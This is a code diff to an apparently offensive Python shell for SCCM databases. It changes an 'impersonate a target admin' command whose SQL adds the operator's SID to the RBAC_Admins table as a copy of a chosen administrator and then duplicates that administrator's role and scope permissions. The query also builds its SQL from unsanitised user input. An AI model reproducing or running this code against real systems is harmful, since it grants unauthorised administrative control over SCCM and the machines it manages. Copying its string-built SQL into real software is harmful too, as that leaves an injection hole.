@@ -709,10 +709,10 @@ class SCCM_SQLSHELL(cmd.Cmd):
         your_user = split_arg[0]
         target_user = split_arg[1]
 
-        # Grab SID
+        # Grab SIDs
         sid_enc = self.user_to_sid(your_user)
 
-        query = f"INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType) SELECT TOP 1 {sid_enc}, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType FROM RBAC_Admins WHERE AdminID = 16777217; DECLARE @oldAdminID INT; DECLARE @newAdminID INT; SET @oldAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE AdminID = 16777217); SET @newAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins ORDER BY AdminID DESC); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @newAdminID, RoleID, ScopeID, ScopeTypeID FROM RBAC_ExtendedPermissions WHERE AdminID = @oldAdminID;"
+        query = f"INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType) SELECT TOP 1 {sid_enc}, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType FROM RBAC_Admins WHERE LogonName = '{target_user}'; DECLARE @oldAdminID INT; DECLARE @newAdminID INT; SET @oldAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{target_user}'); SET @newAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{target_user}' ORDER BY AdminID DESC); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @newAdminID, RoleID, ScopeID, ScopeTypeID FROM RBAC_ExtendedPermissions WHERE AdminID = @oldAdminID;"
         self.__run(query)
 
     """
@@ -732,7 +732,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
         self.__run(query)
 
     """
-    sccm_impersonate_targeted [your_user] [target_user]  - Impersonate a target admin
+    sccm_impersonate_targ [your_user] [target_user]  - Impersonate a target admin
     """
     def do_sccm_impersonate_targ(self, arg=""):
         split_arg = arg.split()
